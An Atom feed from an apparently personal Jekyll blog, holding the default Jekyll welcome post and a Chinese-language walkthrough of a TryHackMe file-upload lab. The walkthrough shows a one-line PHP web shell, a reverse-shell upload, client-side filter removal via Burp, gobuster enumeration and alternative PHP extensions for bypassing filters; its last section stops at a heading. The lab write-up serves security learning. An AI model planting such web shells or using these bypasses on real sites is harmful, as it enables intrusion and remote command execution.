<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-05-25T08:49:31+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Your awesome title</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><entry><title type="html">Welcome to Jekyll!</title><link href="http://localhost:4000/jekyll/update/2022/05/23/welcome-to-jekyll.html" rel="alternate" type="text/html" title="Welcome to Jekyll!" /><published>2022-05-23T18:28:52+08:00</published><updated>2022-05-23T18:28:52+08:00</updated><id>http://localhost:4000/jekyll/update/2022/05/23/welcome-to-jekyll</id><content type="html" xml:base="http://localhost:4000/jekyll/update/2022/05/23/welcome-to-jekyll.html">&lt;p&gt;You’ll find this post in your &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_posts&lt;/code&gt; directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jekyll serve&lt;/code&gt;, which launches a web server and auto-regenerates your site when a file is updated.&lt;/p&gt;

&lt;p&gt;Jekyll requires blog post files to be named according to the following format:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;YEAR-MONTH-DAY-title.MARKUP&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Where &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;YEAR&lt;/code&gt; is a four-digit number, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MONTH&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DAY&lt;/code&gt; are both two-digit numbers, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MARKUP&lt;/code&gt; is the file extension representing the format used in the file. After that, include the necessary front matter. Take a look at the source for this post to get an idea about how it works.&lt;/p&gt;

&lt;p&gt;Jekyll also offers powerful support for code snippets:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Hi, &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;Tom&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#=&amp;gt; prints &apos;Hi, Tom&apos; to STDOUT.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Check out the &lt;a href=&quot;https://jekyllrb.com/docs/home&quot;&gt;Jekyll docs&lt;/a&gt; for more info on how to get the most out of Jekyll. File all bugs/feature requests at &lt;a href=&quot;https://github.com/jekyll/jekyll&quot;&gt;Jekyll’s GitHub repo&lt;/a&gt;. If you have questions, you can ask them on &lt;a href=&quot;https://talk.jekyllrb.com/&quot;&gt;Jekyll Talk&lt;/a&gt;.&lt;/p&gt;</content><author><name></name></author><category term="jekyll" /><category term="update" /><summary type="html">You’ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run jekyll serve, which launches a web server and auto-regenerates your site when a file is updated.</summary></entry><entry><title type="html">File upload wp</title><link href="http://localhost:4000/2022/05/16/file-upload-wp.html" rel="alternate" type="text/html" title="File upload wp" /><published>2022-05-16T00:00:00+08:00</published><updated>2022-05-16T00:00:00+08:00</updated><id>http://localhost:4000/2022/05/16/file%20upload%20wp</id><content type="html" xml:base="http://localhost:4000/2022/05/16/file-upload-wp.html">&lt;h1 id=&quot;0516文件上传绕过client-side&quot;&gt;0516文件上传绕过（client-side）&lt;/h1&gt;

&lt;p&gt;https://tryhackme.com/room/uploadvulns的Task 7&lt;/p&gt;

&lt;p&gt;已知http://java.uploadvulns.thm（PS：需要在/etc/hosts中设置IP和域名对应）只存在client-side的文件上传过滤，目标是得到该服务器/var/www/下的flag&lt;/p&gt;

&lt;p&gt;打开网页如下：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;C:\Users\m5291\Desktop\归档系统\技术-笔记\wp\attachments\image-20220516095801615.png&quot; alt=&quot;image-20220516095801615&quot; /&gt;&lt;/p&gt;

&lt;p&gt;因为是client-side的过滤故查看源代码，发现非png类型文件不可上传&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;C:\Users\m5291\Desktop\归档系统\技术-笔记\wp\attachments\image-20220516100025617.png&quot; alt=&quot;image-20220516100025617&quot; /&gt;&lt;/p&gt;

&lt;p&gt;整个流程是用户请求网页，然后服务器返回网页信息（html等等信息），其中包含了上面用于过滤文件类型的JavaScript代码。然后点击“select file”打开文件后，过滤代码就在用户端运行。点击上传，文件就传输到服务器。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;C:\Users\m5291\Desktop\归档系统\技术-笔记\wp\attachments\image-20220516102207195.png&quot; alt=&quot;image-20220516102207195&quot; /&gt;&lt;/p&gt;

&lt;p&gt;所以我们可以用两种方法来打破client-side过滤的机制：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;在服务器返回网页信息的时候截胡，把过滤代码删掉&lt;/li&gt;
  &lt;li&gt;在过滤代码执行的时候处理，上传一个png后缀文件，但在执行结果返回前把文件类型改回来&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;可以用webshell或者reverse shell：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;webshell我用的是以下代码&lt;/p&gt;

    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php
	echo system($_GET[&quot;cmd&quot;]);
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;reverse shell用的是kali的/usr/share/webshells/php/php-reverse-shell.php（记得改文件里的$IP为攻击机的IP）&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;以上的2X2种方法可以随便组合&lt;/p&gt;

&lt;h2 id=&quot;方法一删过滤代码webshell&quot;&gt;方法一：删过滤代码+webshell&lt;/h2&gt;

&lt;p&gt;打开网页代理，打开burpsuite，选择response to this request来显示服务器返回的包（默认情况下不显示）。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;C:\Users\m5291\Desktop\归档系统\技术-笔记\wp\attachments\image-20220516105740620.png&quot; alt=&quot;image-20220516105740620&quot; /&gt;&lt;/p&gt;

&lt;p&gt;点击forward，收到返回的包，删除过滤的js代码&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;C:\Users\m5291\Desktop\归档系统\技术-笔记\wp\attachments\image-20220516110033263.png&quot; alt=&quot;image-20220516110033263&quot; /&gt;&lt;/p&gt;

&lt;p&gt;点击forward后，正常上传文件即可&lt;/p&gt;

&lt;p&gt;问题是不知道webshell.php在哪，所以用gobuster扫一下文件目录：&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gobuster dir -u http://java.uploadvulns.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;找到一个可疑的文件夹/images，访问这个文件夹：http://java.uploadvulns.thm/images果然在里面，所以只要访问&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://java.uploadvulns.thm/images/webshell.php?cmd=cat /var/www/flag.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;方法二修改文件类型reverse-shell&quot;&gt;方法二：修改文件类型+reverse shell&lt;/h2&gt;

&lt;p&gt;把php-reverse-shell.php改成shell.png(改成shell只是懒得打，但是后缀一定要改)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;C:\Users\m5291\Desktop\归档系统\技术-笔记\wp\attachments\image-20220516110903950.png&quot; alt=&quot;image-20220516110903950&quot; /&gt;&lt;/p&gt;

&lt;p&gt;点击“upload”，修改文件类型，点击forward成功上传&lt;img src=&quot;C:\Users\m5291\Desktop\归档系统\技术-笔记\wp\attachments\image-20220516111059415.png&quot; alt=&quot;image-20220516111059415&quot; /&gt;&lt;/p&gt;

&lt;p&gt;也是一样的用gobuster找到文件上传到何处&lt;/p&gt;

&lt;p&gt;攻击机这边打开netcat的listener，然后访问&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc -lvnp 1234(端口号)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;获得reverse shell，得到flag&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;C:\Users\m5291\Desktop\归档系统\技术-笔记\wp\attachments\image-20220516111412502.png&quot; alt=&quot;image-20220516111412502&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;0516文件上传绕过server-side-文件拓展名过滤&quot;&gt;0516文件上传绕过（server-side）-文件拓展名过滤&lt;/h1&gt;

&lt;p&gt;https://tryhackme.com/room/uploadvulns的Task 8&lt;/p&gt;

&lt;p&gt;后缀改成php5就可以上传了，以下是一些很少使用但服务器或许可以识别的Php后缀名，一个个试出来的：.php3, .php4, .php5, .php7, .phps, .php-s,  .pht .phar。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;C:\Users\m5291\Desktop\归档系统\技术-笔记\wp\attachments\image-20220516152831391.png&quot; alt=&quot;image-20220516152831391&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;0516文件上传绕过server-side-magic-numbers过滤&quot;&gt;0516文件上传绕过（server-side）-magic numbers过滤&lt;/h1&gt;

&lt;p&gt;https://tryhackme.com/room/uploadvulns的Task 9&lt;/p&gt;</content><author><name></name></author><summary type="html">0516文件上传绕过（client-side）</summary></entry></feed>